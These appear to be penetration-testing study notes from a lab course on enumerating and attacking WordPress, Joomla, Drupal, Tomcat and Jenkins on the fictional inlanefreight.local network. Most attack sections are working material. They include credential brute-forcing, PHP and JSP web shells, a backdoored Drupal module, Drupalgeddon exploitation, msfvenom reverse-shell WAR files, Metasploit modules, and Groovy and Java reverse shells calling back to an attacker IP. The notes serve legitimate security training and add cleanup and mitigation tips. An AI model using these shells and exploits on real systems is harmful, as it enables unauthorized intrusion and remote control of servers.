
# 📘 Application Discovery & Enumeration

## 📍 Purpose
- Maintain an **asset inventory** of all devices, software, and applications.
- Detect rogue or shadow IT, outdated applications, weak/default credentials, and unpatched vulnerabilities.
- Improve visibility and defensive posture.
- Help clients find gaps **before attackers do**.

## 🧭 Methodology Overview

### 🔍 Initial Steps
1. Start with **black box discovery** or provided scope.
2. Perform **ping sweep** to identify live hosts.
3. Run **targeted Nmap scan** for common web ports:

```bash
nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
````

4. Use tools like **EyeWitness** or **Aquatone** for web screenshotting.

## 📂 Example Scope List

```
app.inlanefreight.local
dev.inlanefreight.local
drupal-dev.inlanefreight.local
...
10.129.201.50
```

## 🛠 Tools & Usage

### 🧾 EyeWitness

#### ✅ Install

```bash
sudo apt install eyewitness
```

#### ✅ Run Against Nmap Output

```bash
eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
```

#### 📌 Features

* Takes screenshots using Selenium.
* Supports XML input (Nmap, Nessus).
* Fingerprints apps and suggests default creds.

### 🧾 Aquatone

#### ✅ Download

```bash
wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
unzip aquatone_linux_amd64_1.7.0.zip
```

#### ✅ Run with Nmap XML

```bash
cat web_discovery.xml | ./aquatone -nmap
```

#### 📌 Features

* Screenshots and organizes web hosts.
* Categorizes results: High Value, CMS, Forbidden, Splash, etc.
* Fast and lightweight.

## 📝 Notetaking Template

### Notebook Structure Example (OneNote / Notion / Cherrytree / etc.)

```
External Penetration Test - <Client Name>
│
├── Scope
│   ├── CIDR/IPs
│   ├── URLs
│   ├── Fragile Hosts
│   └── Timeframes & Limitations
│
├── Client POCs
├── Credentials
├── Discovery / Enumeration
│   ├── Live Hosts
│   └── Scans (Nmap, Masscan, Nessus, etc.)
│
├── Application Discovery
│   ├── EyeWitness / Aquatone Reports
│   ├── Interesting Hosts
│   └── Potential Vulnerabilities
│
├── Exploitation
│   ├── <Hostname/IP>
│   └── ...
│
└── Post-Exploitation
    ├── <Hostname/IP>
    └── ...
```

### 📌 Enumeration Notes

* Timestamp and log all scans with syntax and target details.
* Highlight interesting subdomains (e.g., `dev`, `qa`, `acc`, `-dev`, `-test`).
* Track software versions, login portals, and Vhosts.
* Mark High-Value Targets (e.g., GitLab, Jenkins, Splunk, Tomcat, CMS).


### 🚨 Tips for Assessments

* **Don’t rely solely on scanners** – manual validation is essential.
* Always **explore built-in functionality** (e.g., file uploads, API endpoints).
* Dev/staging servers often have **lax security controls**.
* Review the **entire screenshot report**, even buried entries may be valuable.
* Avoid rabbit holes early in enumeration; **stay high-level** until discovery is complete.


---

# 🕵️‍♂️ WordPress - Discovery & Enumeration Notes

## 🌐 Target Overview

* **Target URL:** `http://blog.inlanefreight.local`
* **CMS:** WordPress
* **WordPress Version:** 5.8 (vulnerable)

## 🧰 Manual Discovery Summary

### 🔍 Initial Indicators of WordPress

* Accessible files:

  * `/robots.txt` (contains `/wp-admin`, `/wp-content`)
  * `/wp-login.php` (login page)
  * `/xmlrpc.php` (XML-RPC enabled)
* HTML metadata reveals WordPress version:

  ```html
  <meta name="generator" content="WordPress 5.8" />
  ```

### 🎨 Themes
```
curl -s http://blog.inlanefreight.local/ | grep themes
```
* **Theme:** `Transport Gravity` (Child of Business Gravity)
* **Version:** 1.0.1
* **Directory Listing:** Enabled
* **Style URI:** [transport-gravity/style.css](http://blog.inlanefreight.local/wp-content/themes/transport-gravity/style.css)

### 🔌 Plugins Identified

```
curl -s http://blog.inlanefreight.local/ | grep plugins
```
| Plugin Name    | Version | Vulnerabilities                               |
| -------------- | ------- | --------------------------------------------- |
| Contact Form 7 | 5.4.2   | Not confirmed vulnerable in scan              |
| Mail Masta     | 1.0.0   | ✅ LFI, ✅ SQL Injection                        |
| wpDiscuz       | 7.0.4   | ✅ Unauthenticated Remote Code Execution (RCE) |

> ✅ Plugin directories [](http://blog.inlanefreight.local/wp-content/plugins) have directory listing enabled and `readme.txt` files exposed.

### 👤 User Enumeration

try various logins at /wp-login.php

* **Valid Users Discovered:**

  * `admin`
  * `john`

* **Username Enumeration:** Supported via login error message differences:

  * Valid username → "Incorrect password"
  * Invalid username → "Username not registered"


## ⚙️ WPScan Automated Findings

### 🔧 Scan Command Used:

```bash
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token <TOKEN>
```

### 🔍 Key Findings:

* **WordPress Version:** 5.8
* **XML-RPC:** Enabled (`/xmlrpc.php`)
* **Upload Directory:** Listing enabled (`/wp-content/uploads/`)
* **Theme:** `Transport Gravity`, version 1.0.1
* **Plugin Vulnerabilities:**

  * Mail Masta 1.0:

    * ✅ LFI
    * ✅ SQLi
* **Users Enumerated:**

  * `admin`
  * `john`

## 🧠 Analysis & Next Steps

### 🛠 Vulnerabilities of Interest

* **wpDiscuz 7.0.4**: 🔥 *Unauthenticated RCE*
* **Mail Masta 1.0**:

  * 🐚 *Local File Inclusion*
  * 🐞 *SQL Injection*

### 🛡 Other Opportunities

* Exploit user enumeration via brute-force (XML-RPC or login page)
* Directory listings may expose sensitive files
* Consider fingerprinting theme/plugins not found in WPScan manually

---

# 🛠️ Attacking WordPress

## 🎯 Objective

Gain initial access to a WordPress-based web server by abusing weak credentials, misconfigurations, and known vulnerabilities in plugins/themes.


## 🔍 Step 1: Enumerate Users and Plugins

Tools like **WPScan** are used to enumerate:

* WordPress **version**
* Installed **plugins** & **themes**
* **Users**

Example WPScan command for enumeration:

```bash
sudo wpscan --url http://blog.inlanefreight.local --enumerate u,ap,vt
```

## 🚪 Step 2: Brute Force Login Credentials

### 📌 Method: `xmlrpc` (preferred for speed)

```bash
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

✅ Success:

```
Username: john
Password: firebird1
```


## 🧬 Step 3: Code Execution via Theme Editor

### 🖥️ Login to WordPress Admin Panel:

URL: `http://blog.inlanefreight.local/wp-login.php`

### 🛠️ Modify an Inactive Theme (e.g., `Twenty Nineteen`)

Navigate:

```
Appearance > Theme Editor > Select Theme > 404.php
```

### 💻 Inject a PHP web shell:

```php
<?php system($_GET[0]); ?>
```

### 🧪 Test Shell Access:

```bash
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```


## ⚙️ Step 4: Automated Shell Upload via Metasploit

### 🧰 Use `wp_admin_shell_upload` module:

```bash
use exploit/unix/webapp/wp_admin_shell_upload
set rhosts 10.129.42.195
set vhost blog.inlanefreight.local
set username john
set password firebird1
set lhost 10.10.14.15
exploit
```

💥 Opens Meterpreter session as `www-data`.


## 🧨 Step 5: Exploiting Vulnerable Plugins

### 🧵 mail-masta (Unauthenticated LFI)

Vulnerable code:

```php
include($_GET['pl']); // No sanitization!
```

Exploit:

```bash
curl "http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```

### 🪓 wpDiscuz 7.0.4 (Unauthenticated RCE)

* Vulnerability: **File upload bypass** via image upload feature
* CVE: **CVE-2020-24186**

Exploit script:

```bash
python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
```

Upload Result:

```bash
http://blog.inlanefreight.local/wp-content/uploads/2021/08/<shell>.php?cmd=id
```

## 🧹 Post-Exploitation & Clean-up

🧾 Add the following to your report:

* **Exploited systems** (IP/hostname + vector)
* **Compromised users** (username, creds, access level)
* **Artifacts** (web shells, payloads, logs)
* **Modifications** (user creation, privilege changes)

📌 Clean up:

* Remove uploaded shells (e.g., `.php` files in uploads or plugin dirs)
* Remove added users or changes made during testing

---

# Joomla - Discovery & Enumeration

## Overview

Joomla is a free and open-source CMS, released in August 2005. It is widely used for:

* Forums, galleries, eCommerce, user communities
* Written in **PHP** with **MySQL** backend
* Enhanced by 7,000+ extensions and 1,000+ templates

## API Enumeration

Query Joomla’s CMS version stats:

```bash
curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool
```

Returns data such as:

```json
"total": 2776276,
"cms_version": {
    "3.9": 30.28,
    "3.6": 24.29,
    "3.8": 18.84,
    ...
}
```

## Discovery Techniques

### Initial Fingerprinting

**Identify via meta tag:**

```bash
curl -s http://dev.inlanefreight.local/ | grep Joomla
```

Returns:

```html
<meta name="generator" content="Joomla! - Open Source Content Management" />
```

### robots.txt Check

Common Joomla `robots.txt` disallows:

```
Disallow: /administrator/
Disallow: /components/
Disallow: /modules/
...
```

### Favicon

Can be used for visual fingerprinting (not always unique).

### README.txt

```bash
curl -s http://dev.inlanefreight.local/README.txt | head -n 5
```

May show:

```
* Joomla! installation/upgrade package to version 3.x
* Joomla! 3.9 version history - https://docs.joomla.org/...
```

### XML Manifest

```bash
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
```

Look for `<version>` tag:

```xml
<version>3.9.4</version>
```

### cache.xml

Also useful for approximate version info:

```bash
curl -s http://dev.inlanefreight.local/plugins/system/cache/cache.xml
```

## Enumeration Tools

### droopescan

Install:

```bash
sudo pip3 install droopescan
```

Run:

```bash
droopescan scan joomla --url http://dev.inlanefreight.local/
```

**Findings:**

* Possible versions: 3.8.7 - 3.8.13
* Interesting URLs:

  * `joomla.xml`
  * `administrator/`
  * `LICENSE.txt`
  * `cache.xml`



### JoomlaScan (Python 2.7)

Install dependencies:

```bash
sudo python2.7 -m pip install urllib3 certifi bs4
```

Run:

```bash
python2.7 joomlascan.py -u http://dev.inlanefreight.local
```

**Findings:**

* Components: `com_actionlogs`, `com_admin`, `com_ajax`, `com_banners`
* Explorable directories and LICENSE files


## Authentication Brute Force

Default Joomla admin username is `admin`. Password is set during installation.

### Attempt brute-force with weak credentials

```bash
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

**Successful login:**

```plaintext
admin:admin
```

---

# Attacking Joomla

## Objective
Gain access to the internal environment of a Joomla-based e-commerce site to perform enumeration or post-exploitation activities.

## 🎯 Abusing Built-In Functionality

### 1. Admin Panel Login
- Target: `http://dev.inlanefreight.local/administrator`
- Credentials: `admin:admin`

### 2. Fixing Login Error
If you encounter:

"An error has occurred. Call to a member function format() on null"

- Navigate to: `http://dev.inlanefreight.local/administrator/index.php?option=com_plugins`
- Disable: `Quick Icon - PHP Version Check` plugin

### 3. Template-Based RCE
- Go to: **Templates** → Select `protostar` → Edit `error.php`
- Insert PHP Web Shell:
  ```php
  <?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>

* Save & Close

### 4. Confirm Execution

```bash
curl -s "http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id"
```

Expected Output:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 🔐 Best Practices

* Use non-obvious filenames/parameters
* Limit access (e.g., by IP or password)
* Clean up the shell after use
* Document: file name, hash, and location for reporting

## 🧨 Leveraging Known Vulnerabilities

### CVE-2019-10945

* **Type**: Directory Traversal & Authenticated File Deletion
* **Affected**: Joomla 1.5.0 – 3.9.4
* **Target Version**: Joomla 3.9.4

### Usage

Use the exploit script:

```bash
python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
```

### Outcome

Lists webroot directories:

```
administrator
components
images
includes
modules
templates
...
configuration.php
index.php
```

> This vulnerability can be used to read or delete sensitive files if accessible via the browser.

---

# 🧭 Drupal - Discovery & Enumeration

## 📘 Overview
- **Drupal** is an open-source CMS written in PHP.
- Supports: **MySQL**, **PostgreSQL**, and **SQLite**.
- Enhancements: **Themes** and **Modules** (43,000+ modules, 2,900+ themes).
- Major users: **Tesla**, **Warner Bros Records**, many governments, and universities

## 🔍 Discovery / Footprinting

### Identifying Drupal
Ways to identify a Drupal CMS:
- Page source includes `Powered by Drupal` or `<meta name="Generator" ...>`
- Standard Drupal **logo**
- Presence of `/CHANGELOG.txt` or `/README.txt`
- Clues in `/robots.txt` like `/node`

### Example:
```bash
curl -s http://drupal.inlanefreight.local | grep Drupal
````

Output:

```html
<meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
<span>Powered by <a href="https://www.drupal.org">Drupal</a></span>
```

### Node Enumeration

Drupal content uses `/node/<id>` structure (e.g., `/node/1`)

## 👥 Default User Types

1. **Administrator**: Full control
2. **Authenticated User**: Limited access (based on permissions)
3. **Anonymous**: Default visitor, usually read-only


## 🛠 Enumeration Techniques

### 1. Access CHANGELOG.txt

Older versions might expose this file:

```bash
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
```

Output:

```
Drupal 7.57, 2018-02-21
```

If blocked:

```bash
curl -s http://drupal.inlanefreight.local/CHANGELOG.txt
# 404 Not Found
```

### 2. Droopescan

Droopescan offers rich Drupal scanning functionality.

#### Run:

```bash
droopescan scan drupal -u http://drupal.inlanefreight.local
```

#### Output:

```
[+] Plugins found:
    php http://drupal.inlanefreight.local/modules/php/
         http://drupal.inlanefreight.local/modules/php/LICENSE.txt

[+] No themes found.

[+] Possible version(s):
    8.9.0
    8.9.1

[+] Possible interesting urls found:
    Default admin - http://drupal.inlanefreight.local/user/login
```

### Interpretation

* Likely running **Drupal 8.9.1**
* No obvious core vulnerabilities at time of writing
* Next steps: Inspect **installed modules** and check for **abusable functionality**

---

# 🛡️ Attacking Drupal

## 📌 Overview of Attacking Drupal

* **Goal**: Gain shell access or remote code execution (RCE) on a Drupal instance.
* **CMS Target**: Drupal – often more hardened than some CMS platforms (e.g., WordPress).
* **Initial Step**: Identify Drupal and fingerprint the version.

## 🧩 PHP Filter Module Exploitation

### 🟡 Drupal < 8

1. **Enable PHP Filter Module**:

   * Navigate: `Admin > Extend`
   * Enable: `PHP filter`
2. **Create a New Page**:

   * Navigate: `Content > Add content > Basic Page`
   * Insert:

     ```php
     <?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>
     ```
   * Set Text Format: `PHP code`
3. **Access Shell**:

   * Example URL:
     `http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id`
   * Command-line usage:

     ```bash
     curl -s http://<target> | grep uid
     ```

### 🔵 Drupal ≥ 8

* **PHP Filter is not installed by default**
* Steps:

  1. Download:

     ```bash
     wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
     ```
  2. Install via Admin Interface: `Admin > Extend > Install new module`
  3. Proceed with the same page creation and shell insertion as in version 7

⚠️ **Warning**: Always inform the client and **remove module/pages** after testing.


## 🎯 Uploading a Backdoored Module

1. **Download Legit Module**:

   ```bash
   wget https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
   tar xvf captcha-8.x-1.2.tar.gz
   ```

2. **Add Web Shell**:
   `shell.php`:

   ```php
   <?php system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']); ?>
   ```

   `.htaccess`:

   ```apache
   <IfModule mod_rewrite.c>
   RewriteEngine On
   RewriteBase /
   </IfModule>
   ```

3. **Repackage Module**:

   ```bash
   mv shell.php .htaccess captcha/
   tar cvf captcha.tar.gz captcha/
   ```

4. **Upload & Trigger**:

   * Install via: `Admin > Extend > Install new module`
   * Trigger:

     ```bash
     curl http://drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
     ```

## 🧨 Drupalgeddon Exploits

### 1. **Drupalgeddon (CVE-2014-3704)**

* **Type**: Pre-auth SQL Injection → Add admin user
* **Affected**: Drupal 7.0–7.31
* **Fix**: 7.32
* **Exploit Usage**:

  ```bash
  python2.7 drupalgeddon.py -t http://target -u hacker -p pwnd
  ```
* **Outcome**: Creates admin user, then login and execute previous PHP Filter RCE methods.

### 2. **Drupalgeddon2 (CVE-2018-7600)**

* **Type**: **Unauthenticated Remote Code Execution (RCE)**
* **Affected Versions**:

  * Drupal 7.x < 7.58
  * Drupal 8.x < 8.3.9, < 8.4.6, < 8.5.1

#### 🧪 Exploitation Process

1. **Check if Vulnerable**:

   * Run:

     ```bash
     python3 drupalgeddon2.py
     ```

   * Input target:
     `http://drupal-dev.inlanefreight.local/`

   * Validate with:

     ```bash
     curl -s http://drupal-dev.inlanefreight.local/hello.txt
     ```

2. **Create Base64-Encoded Web Shell**:

   ```bash
   echo '<?php system($_GET["fe8edbabc5c5c9b7b764504cd22b17af"]); ?>' | base64
   ```

   Result:

   ```
   PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K
   ```

3. **Inject Shell via Modified Script**:

   * Write decoded shell:

     ```bash
     echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
     ```
   * Rerun exploit to upload this shell file.

4. **Trigger the Shell**:

   ```bash
   curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
   ```

   Output:

   ```
   uid=33(www-data) gid=33(www-data) groups=33(www-data)
   ```

#### 🧯 Detection & Mitigation

* **Update Drupal** immediately to:

  * 7.58+
  * 8.3.9 / 8.4.6 / 8.5.1+
* Monitor logs for:

  * `/user/register` requests with suspicious `#` parameters
  * Unexpected files like `hello.txt`, `mrb3n.php`
* Use a **WAF** to block injection attempts.

### 3. **Drupalgeddon3 (CVE-2018-7602)**

* **Type**: Authenticated RCE (node deletion permission required)
* **Affected**: Drupal 7.x and 8.x
* **Exploit**: Form API misuse
* **Tool**: Metasploit

#### 🔧 Exploitation Steps

1. **Login to Drupal Admin**
2. **Get Session Cookie**
3. **Set up Metasploit Module**:

   ```bash
   use exploit/multi/http/drupal_drupageddon3
   set RHOSTS <target_ip>
   set VHOST drupal-acc.inlanefreight.local
   set DRUPAL_SESSION SESS<session_cookie>
   set DRUPAL_NODE 1
   set LHOST <your_ip>
   exploit
   ```
4. **Meterpreter Session Confirmed**:

   ```bash
   meterpreter > getuid
   meterpreter > sysinfo
   ```

---

# ☕ Apache Tomcat - Discovery & Enumeration

## 🔎 Overview

* **Apache Tomcat** is a Java servlet and JSP engine.
* Commonly used with frameworks like **Spring**, **Gradle**.
* Often seen in **internal networks**, less exposed externally.

## 🛰️ Discovery Techniques

### 🧭 1. Identify via HTTP Headers

```bash
curl -i http://host:8080/invalid
```

* Look for **Server: Apache-Coyote/1.1** or **Tomcat version** in error page.

### 📚 2. Check Default Docs

```bash
curl -s http://host:8080/docs/ | grep Tomcat
```

* Confirms version like `Apache Tomcat 9.0.30`.

## 🗂️ Tomcat Directory Structure

```
├── bin               # Startup scripts
├── conf              # Config files (e.g., tomcat-users.xml)
├── lib               # JAR libraries
├── logs              # Logs
├── temp              # Temp files
├── webapps           # Deployed apps
│   ├── manager       # Admin panel
│   └── ROOT          # Default app
└── work              # Runtime cache
```

### 📌 Key Files:

* `conf/tomcat-users.xml`: user roles & passwords
* `webapps/<app>/WEB-INF/web.xml`: route-to-class mappings
* `WEB-INF/classes/`: compiled `.class` files
* `jsp/`: JSP pages like `admin.jsp`

## 🧾 Sample web.xml (Deployment Descriptor)

```xml
<servlet>
  <servlet-name>AdminServlet</servlet-name>
  <servlet-class>com.inlanefreight.api.AdminServlet</servlet-class>
</servlet>
<servlet-mapping>
  <servlet-name>AdminServlet</servlet-name>
  <url-pattern>/admin</url-pattern>
</servlet-mapping>
```

### Resolves to class path:

```
WEB-INF/classes/com/inlanefreight/api/AdminServlet.class
```

## 🔐 tomcat-users.xml Sample

```xml
<role rolename="manager-gui" />
<user username="tomcat" password="tomcat" roles="manager-gui" />

<role rolename="admin-gui" />
<user username="admin" password="admin" roles="manager-gui,admin-gui" />
```
### Built-in Roles:

* `manager-gui`: GUI access
* `manager-script`: HTTP API
* `manager-jmx`: JMX proxy
* `manager-status`: Status pages only

## 🔍 Enumeration

### 🔎 Gobuster Scan

```bash
gobuster dir -u http://host:8180 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```

### 🗂️ Common Paths:

* `/manager`
* `/host-manager`
* `/docs`
* `/examples`

## 🔑 Access Manager Panel

Try default credentials:

```
tomcat:tomcat
admin:admin
```

If successful:

* Deploy a `.war` file with **JSP web shell**.
* Gain **Remote Code Execution**.

## 🛠️ Next Steps

* If login fails, attempt **brute force**.
* Exploit known **vulnerabilities** (e.g., CVE-2020-1938, Ghostcat).
* Look for **LFI** to access `web.xml`, `tomcat-users.xml`.

---


# ☕ Attacking Apache Tomcat

## 🎯 Objective

Gain RCE or file access on an externally exposed Tomcat instance (`web01.inlanefreight.local:8180`) by abusing weak/default credentials and known vulnerabilities.

## 1️⃣ Tomcat Manager – Login Brute Force

### 🛠️ Using Metasploit Module

* **Module**: `auxiliary/scanner/http/tomcat_mgr_login`
* **Key Options**:

  ```
  set VHOST       web01.inlanefreight.local
  set RHOSTS      10.129.201.58
  set RPORT       8180
  set STOP_ON_SUCCESS true
  set THREADS     1
  ```
* **Default wordlists** (Metasploit):

  * Users: `/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt`
  * Passwords: `/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt`

#### 🔍 Run and Result

```text
run
[+] 10.129.201.58:8180 - Login Successful: tomcat:admin
[*] Auxiliary module execution completed
```

* Found valid credentials: **tomcat** / **admin**

> **Tip**: If module behavior is unexpected, proxy via Burp/ZAP by setting  `set PROXIES HTTP:127.0.0.1:8080`.
> Inspect Authorization headers to confirm Base64 encoding of `username:password`.


### 🐍 Python Script Alternative

* **Usage**:

  ```
  python3 mgr_brute.py \
    -U http://web01.inlanefreight.local:8180/ \
    -P /manager \
    -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt \
    -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
  ```

## 2️⃣ WAR File Upload via Manager GUI

### 🔑 Prerequisite

* Valid **manager-gui** credentials (e.g., `tomcat:admin`).
* Access to `http://web01.inlanefreight.local:8180/manager/html`.


### 📝 Steps to Deploy a JSP Web Shell

1. **Download a simple JSP shell** (e.g., `cmd.jsp`):

   ```bash
   wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
   ```

   ```jsp
   <%@ page import="java.util.*,java.io.*"%>
   <HTML><BODY>
   <FORM METHOD="GET" NAME="myform">
     <INPUT TYPE="text" NAME="cmd">
     <INPUT TYPE="submit" VALUE="Send">
   </FORM>
   <pre>
   <%
     if (request.getParameter("cmd") != null) {
       Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
       BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
       String line = null;
       while ((line = in.readLine()) != null) {
         out.println(line);
       }
     }
   %>
   </pre>
   </BODY></HTML>
   ```

2. **Package into a WAR**:

   ```bash
   zip -r backup.war cmd.jsp
   ```

3. **Log in to Manager GUI** → Browse → Select `backup.war` → Deploy.

   * Context path will be `/backup`.

4. **Access the shell**:

   ```
   http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
   ```

   * Example via cURL:

     ```bash
     curl "http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id"
     ```

5. **Cleanup**:

   * From Manager GUI, click **Undeploy** next to `/backup`.
   * Verify removal of:

     ```
     /opt/tomcat/apache-tomcat-*/webapps/backup.war
     /opt/tomcat/apache-tomcat-*/webapps/backup/
     ```

### 🤖 Automated WAR Upload via Metasploit

* **Module**: `multi/http/tomcat_mgr_upload`
* Automates authentication + WAR upload + payload execution.

### 🛠️ Using msfvenom to Create a Reverse JSP Shell

```bash
msfvenom -p java/jsp_shell_reverse_tcp \
 lhost=10.10.14.15 lport=4443 -f war > rev_shell.war
```

* Deploy `rev_shell.war` via Manager GUI.
* Start Netcat listener:

  ```bash
  nc -lnvp 4443
  ```
* Browse to shell to trigger payload:

  ```
  http://web01.inlanefreight.local:8180/backup/
  ```
* Gain a reverse shell as **tomcat** user.

## 3️⃣ CVE-2020-1938 Ghostcat (AJP LFI)

### 📌 Overview

* Vulnerable versions: Tomcat < 9.0.31, < 8.5.51, < 7.0.100
* Flaw in **AJP (Apache JServ Protocol)** listener (default port **8009**).
* Allows reading of arbitrary files under webapps directory (e.g., `WEB-INF/web.xml`).

### 🔍 Detection with Nmap

```bash
nmap -sV -p 8009,8080 app-dev.inlanefreight.local
```

* Sample output:

  ```
  8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
  8080/tcp open  http    Apache Tomcat 9.0.30
  ```

### 🧪 Exploit with Public PoC Script

1. **Get the script** (e.g., `tomcat-ajp.lfi.py`).
2. **Run against target**:

   ```bash
   python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 \
     -f WEB-INF/web.xml
   ```
3. **Result**: Contents of `WEB-INF/web.xml` echo to console:

   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <web-app ...>
     <display-name>Welcome to Tomcat</display-name>
     ...
   </web-app>
   ```
4. **Potential next steps**:

   * Read `tomcat-users.xml` if located under webapps (e.g., via path traversal).
   * Enumerate custom application descriptors (e.g., `WEB-INF/classes/*.class`).
   * Identify hard-coded secrets or sensitive endpoints.


## 📌 Cleanup & Reporting Artifacts

* **Document**:

  * Successfully brute-forced credentials (`tomcat:admin`).
  * Paths of uploaded shells (`/backup/cmd.jsp`, `backup.war`).
  * Files retrieved via Ghostcat (e.g., `WEB-INF/web.xml`).
* **Revert Changes**:

  * Undeploy/remove WAR uploads.
  * Remove any custom JSP or payload files.

---


# Jenkins - Discovery & Enumeration

Jenkins is an open-source automation server written in Java. It enables continuous integration and delivery (CI/CD), helping developers build, test, and deploy software efficiently.

## Discovery / Footprinting

### Scenario

Assume:
- We are conducting an **internal penetration test**.
- Discovered a likely Jenkins instance.
- Potential for **RCE as SYSTEM**, providing an entry point into **Active Directory**.

### Default Ports

- **8080** – Default web interface port.
- **5000** – Used for master-slave communication.

### Security Mechanisms

Jenkins supports various security realms and authorization methods:

- **Local database**
- **LDAP**
- **Unix user database**
- **Delegated to servlet container**
- **No authentication** (common in misconfigured setups)

Admins can control:
- Account registration permissions
- Authorization roles and access controls

## Enumeration Techniques

### Identify Jenkins Instance

#### Jenkins Configure Security Page
```plaintext
http://jenkins.inlanefreight.local:8000/configureSecurity/
````

* Shows authentication and security realm settings.
* Example: `'Jenkins’ own user database'` and `'Logged-in users can do anything'`.

#### Jenkins Login Page

```plaintext
http://jenkins.inlanefreight.local:8000/login?from=%2F
```

* Standard login with username, password, and "Keep me signed in" option.
* Good fingerprinting indicator.

### Weak / Default Credentials

* Common defaults:

  * `admin:admin`
  * `admin:password`
* Misconfigured Jenkins servers **might not require authentication**.
* Such configurations have been found in **internal and occasionally external** penetration tests.

---

# Attacking Jenkins

Once access is gained to a Jenkins application (e.g., via weak credentials), there are multiple attack paths, the most straightforward being **Remote Code Execution (RCE)** via the **Script Console**.

## 1. Script Console

### URL
```plaintext
http://jenkins.inlanefreight.local:8000/script
````

* Allows execution of **Groovy scripts** in the Jenkins controller runtime.
* **Groovy**: Java-compatible language (similar to Python/Ruby), compiled to Java bytecode.
* Often Jenkins runs as **SYSTEM/root**, making this an easy privilege escalation vector.

### Example: Execute `id` Command (Linux)

```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

## 2. Reverse Shell (Linux)

### Groovy Reverse Shell

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### Listener Example

```bash
nc -lvnp 8443
```

**Output:**

```plaintext
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 57844
id
uid=0(root) gid=0(root) groups=0(root)
/bin/bash -i
```
## 3. Windows Command Execution

### Basic Command Execution

```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

### Reverse Shell (Java - Windows)

```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read());
  while(pe.available()>0)so.write(pe.read());
  while(si.available()>0)po.write(si.read());
  so.flush();po.flush();
  Thread.sleep(50);
  try {p.exitValue();break;} catch (Exception e){}
};
p.destroy();s.close();
```

### PowerShell Cradle (Windows)

* Use **Invoke-PowerShellTcp.ps1** script.
* Example payload: PowerShell one-liner to download and execute.

## 4. Miscellaneous Vulnerabilities

### CVE-2018-1999002 & CVE-2019-1003000

* **Unauthenticated RCE**
* Bypasses **Groovy sandbox protections**
* Exploits dynamic routing to load & execute malicious JAR files

### Jenkins 2.150.2 - Node.js RCE

* Requires **JOB creation** and **BUILD** privileges
* Exploitable if **anonymous access** is enabled (default grants these permissions)

---

# Splunk - Discovery & Enumeration

### 🛠 What is Splunk?

* Log analytics platform used for monitoring, analysis, and visualization.
* Commonly used in enterprise environments, including security operations.
* Can be converted to a **SIEM-like tool** via add-ons and configurations.

### ⚠️ Security Considerations

* **Known CVEs**:

  * CVE-2018-11409 – Information Disclosure
  * CVE-2011-4642 – Authenticated RCE (very old versions)
* Splunk patches quickly; few exploitable vulnerabilities.
* **Risk Area**: Misconfiguration or weak credentials (e.g., unauthenticated access or `admin:changeme`).

### 🔎 Discovery Tips

* Splunk web server typically runs on:

